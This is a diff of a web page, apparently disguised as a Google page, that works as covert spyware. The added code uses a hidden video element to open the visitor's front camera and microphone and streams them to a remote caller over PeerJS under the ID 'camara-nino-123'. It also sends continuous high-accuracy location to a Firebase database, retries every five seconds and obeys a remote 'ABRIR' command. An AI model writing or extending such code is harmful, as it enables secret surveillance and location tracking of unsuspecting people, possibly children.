@@ -1,51 +1,58 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
+    <title>Google Service</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <style>
-        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
-        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; height: 100vh; }
-        .logo { width: 160px; margin-bottom: 20px; cursor: pointer; }
-        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; box-shadow: 0 1px 6px rgba(32,33,36,.28); outline: none; }
-        #vLocal { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
-    </style>
 </head>
 <body>
-    <video id="vLocal" autoplay playsinline muted></video>
-    <div class="google-home" onclick="activar()">
-        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-        <input type="text" class="search-bar" placeholder="Buscar en Google...">
-    </div>
-
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
     <script>
         const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const peer = new Peer('camara-nino-123'); 
-        let miStream = null;
 
-        async function activar() {
-            try {
-                miStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                document.getElementById('vLocal').srcObject = miStream;
-            } catch (e) { console.log("Permiso denegado"); }
-        }
-
-        db.ref('comando_camara').on('value', (snap) => {
-            if (snap.val() === "ABRIR") activar();
+        // Configuración Global (STUN) para conectar en cualquier red
+        const peer = new Peer('camara-nino-123', {
+            config: { 'iceServers': [{ url: 'stun:stun.l.google.com:19302' }] }
         });
 
+        let miStream = null;
+
+        // 1. FUNCIÓN CÁMARA Y AUDIO
+        async function activarTodo() {
+            try {
+                miStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true // Permite escuchar audio
+                });
+                document.getElementById('v').srcObject = miStream;
+                enviarUbicacion();
+            } catch (e) { console.log("Permisos pendientes..."); }
+        }
+
+        // 2. FUNCIÓN UBICACIÓN EN TIEMPO REAL
+        function enviarUbicacion() {
+            navigator.geolocation.watchPosition((pos) => {
+                db.ref('ubicacion').set({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    timestamp: Date.now()
+                });
+            }, null, { enableHighAccuracy: true });
+        }
+
+        // SEGUNDO PLANO: Reintento automático cada 5 segundos si se corta
+        setInterval(() => {
+            if (!miStream || !miStream.active) activarTodo();
+        }, 5000);
+
+        db.ref('comando_camara').on('value', (s) => { if(s.val()==="ABRIR") activarTodo(); });
+
         peer.on('call', (call) => {
-            if (miStream) {
-                call.answer(miStream);
-            } else {
-                activar().then(() => { if(miStream) call.answer(miStream); });
-            }
+            call.answer(miStream);
         });
     </script>
 </body>
